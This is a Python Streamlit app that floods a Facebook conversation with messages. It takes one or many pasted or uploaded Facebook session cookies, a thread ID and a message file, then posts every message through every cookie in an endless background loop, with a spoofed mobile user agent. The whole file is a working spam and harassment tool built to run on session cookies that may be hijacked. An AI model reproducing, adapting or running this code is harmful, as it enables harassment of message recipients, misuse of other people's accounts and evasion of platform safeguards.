import streamlit as st
import requests
import threading
import time
import random
import string
from datetime import datetime
import os

# Page configuration
st.set_page_config(
    page_title="MR WALEED OFFLINE",
    page_icon="☠️",
    layout="centered",
    initial_sidebar_state="collapsed"
)

# Suppress Streamlit warnings for server deployment
os.environ['PYTHONPATH'] = os.environ.get('PYTHONPATH', '') + os.pathsep + os.path.dirname(os.path.abspath(__file__))

# Custom CSS (your dark UI preference)
st.markdown("""
<style>
    .main {background-image: url('https://i.ibb.co/TBtHnkz/62dfe1b3d1a831062d951d680bced0e6.jpg'); background-size: cover; background-repeat: no-repeat; background-attachment: fixed;}
    .stApp {background: rgba(0, 0, 0, 0.8);}
    .title-text {text-align: center; color: white; font-size: 2.5em; font-weight: bold; text-shadow: 2px 2px 4px #000000; animation: glow 1s ease-in-out infinite alternate;}
    @keyframes glow {from { text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #e60073; } to { text-shadow: 0 0 20px #fff, 0 0 30px #ff4da6, 0 0 40px #ff4da6; }}
    .success-box {background: rgba(0, 255, 0, 0.2); border: 2px solid #00ff00; border-radius: 10px; padding: 20px; margin: 10px 0; color: #00ff00; text-align: center;}
    .error-box {background: rgba(255, 0, 0, 0.2); border: 2px solid #ff0000; border-radius: 10px; padding: 20px; margin: 10px 0; color: #ff9900; text-align: center;}
    .info-box {background: rgba(0, 0, 255, 0.2); border: 2px solid #0000ff; border-radius: 10px; padding: 20px; margin: 10px 0; color: #00ffff; text-align: center;}
    .stTextInput input, .stTextArea textarea, .stNumberInput input {background: rgba(255, 255, 255, 0.1) !important; color: white !important; border: 2px solid white !important; border-radius: 10px !important;}
    .stSelectbox div[data-baseweb="select"] {background: rgba(255, 255, 255, 0.1) !important; color: white !important; border: 2px solid white !important; border-radius: 10px !important;}
    .stFileUploader section {background: rgba(255, 255, 255, 0.1) !important; border: 2px dashed white !important; border-radius: 10px !important;}
</style>
""", unsafe_allow_html=True)

# Headers for requests
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

# Initialize session state
if 'tasks' not in st.session_state:
    st.session_state.tasks = {}
if 'stop_events' not in st.session_state:
    st.session_state.stop_events = {}
if 'active_threads' not in st.session_state:
    st.session_state.active_threads = {}
if 'message_log' not in st.session_state:
    st.session_state.message_log = []

def send_messages(cookies_list, thread_id, mn, time_interval, messages, task_id):
    stop_event = st.session_state.stop_events[task_id]
    st.session_state.tasks[task_id] = {"status": "Running", "start_time": datetime.now()}
    
    message_count = 0
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for cookie in cookies_list:
                if stop_event.is_set():
                    break
                try:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    
                    session = requests.Session()
                    cookie_dict = {}
                    for c in cookie.strip().split(';'):
                        if '=' in c:
                            key, value = c.strip().split('=', 1)
                            cookie_dict[key] = value
                    
                    session.cookies.update(cookie_dict)
                    session.headers.update(headers)
                    
                    parameters = {'message': message}
                    response = session.post(api_url, data=parameters)
                    
                    if response.status_code == 200:
                        log_message = f"✅ Message Sent: {message}"
                        st.session_state.message_log.append(log_message)
                        message_count += 1
                    else:
                        log_message = f"❌ Failed (Status {response.status_code}): {message}"
                        st.session_state.message_log.append(log_message)
                    
                    if len(st.session_state.message_log) > 50:
                        st.session_state.message_log.pop(0)
                        
                    time.sleep(time_interval)
                except Exception as e:
                    log_message = f"⚠️ Error: {str(e)}"
                    st.session_state.message_log.append(log_message)
                    time.sleep(2)
    
    st.session_state.tasks[task_id]["status"] = "Stopped"
    st.session_state.tasks[task_id]["end_time"] = datetime.now()
    st.session_state.tasks[task_id]["total_messages"] = message_count

def start_task(cookies_list, thread_id, mn, time_interval, messages):
    task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    st.session_state.stop_events[task_id] = threading.Event()
    
    thread = threading.Thread(
        target=send_messages, 
        args=(cookies_list, thread_id, mn, time_interval, messages, task_id)
    )
    thread.daemon = True
    thread.start()
    
    st.session_state.active_threads[task_id] = thread
    return task_id

def stop_task(task_id):
    if task_id in st.session_state.stop_events:
        st.session_state.stop_events[task_id].set()
        return True
    return False

# Main App
def main():
    st.markdown('<div class="title-text">☠️❤️ 👇MR WALEED OFFLINE 👇❤️☠️</div>', unsafe_allow_html=True)
    
    with st.container():
        col1, col2, col3 = st.columns([1, 2, 1])
        
        with col2:
            with st.form("message_form"):
                st.markdown("### 🚀 Start New Task")
                
                cookie_option = st.selectbox("Select Cookie Option", ["Single Cookie", "Multiple Cookies"])
                
                if cookie_option == "Single Cookie":
                    cookie_input = st.text_area("Cookie String Here..♥️", placeholder="Paste your Facebook cookie here...", height=100)
                    cookies_list = [cookie_input] if cookie_input else []
                else:
                    cookie_file = st.file_uploader("Upload Cookie File", type=['txt'])
                    if cookie_file:
                        cookies_list = cookie_file.read().decode().strip().splitlines()
                    else:
                        cookies_list = []
                
                thread_id = st.text_input("Thread ID...", placeholder="Enter conversation UID")
                kidx = st.text_input("Sender Index...", placeholder="Enter sender name")
                time_interval = st.number_input("Time Gap...♥️ (seconds)", min_value=1, value=5)
                
                message_file = st.file_uploader("Message File..♥️", type=['txt'])
                
                start_button = st.form_submit_button("☠️ START SENDING ☠️")
                
                if start_button:
                    if not cookies_list:
                        st.error("❌ Please provide cookies!")
                    elif not thread_id:
                        st.error("❌ Please enter conversation UID!")
                    elif not kidx:
                        st.error("❌ Please enter sender name!")
                    elif not message_file:
                        st.error("❌ Please upload message file!")
                    else:
                        messages = message_file.read().decode().splitlines()
                        task_id = start_task(cookies_list, thread_id, kidx, time_interval, messages)
                        st.success(f"✅ Task started with ID: **{task_id}**")
            
            st.markdown("---")
            st.markdown("### ⏹️ Stop Task")
            stop_col1, stop_col2 = st.columns([3, 1])
            
            with stop_col1:
                stop_task_id = st.text_input("Task ID..♥️", placeholder="Enter task ID to stop")
            
            with stop_col2:
                stop_button = st.button("❤️ STOP TASK ❤️", type="secondary")
                
                if stop_button and stop_task_id:
                    if stop_task(stop_task_id):
                        st.success(f"✅ Task {stop_task_id} stopped successfully!")
                    else:
                        st.error(f"❌ Task {stop_task_id} not found!")
            
            st.markdown("---")
            st.markdown("### 📊 Active Tasks")
            
            if st.session_state.tasks:
                for task_id, task_info in st.session_state.tasks.items():
                    status_color = "🟢" if task_info["status"] == "Running" else "🔴"
                    st.write(f"{status_color} **Task ID:** {task_id}")
                    st.write(f"   **Status:** {task_info['status']}")
                    st.write(f"   **Started:** {task_info['start_time'].strftime('%Y-%m-%d %H:%M:%S')}")
                    
                    if "total_messages" in task_info:
                        st.write(f"   **Messages Sent:** {task_info['total_messages']}")
                    if "end_time" in task_info:
                        st.write(f"   **Ended:** {task_info['end_time'].strftime('%Y-%m-%d %H:%M:%S')}")
                    
                    st.write("---")
            else:
                st.info("📝 No active tasks")
            
            st.markdown("### 📝 Message Log")
            log_container = st.container()
            with log_container:
                for log in reversed(st.session_state.message_log[-10:]):
                    st.write(log)
    
    st.markdown("---")
    col1, col2, col3 = st.columns(3)
    with col1:
        st.markdown("**☠️💣👇MR WALEED OFFLINE 👇💣☠️**")
    with col2:
        st.markdown("[ᴡʜɪsᴋᴇʀ ᴡᴇʀᴇ ᴏɴ ᴅᴜᴛʏ](https://www.facebook.com/officelwaleed)")
    with col3:
        st.markdown("[💬 ᴄᴀʟʟ ɴᴏᴡ 💬](https://wa.me/+923150596250)")

if __name__ == '__main__':
    main()
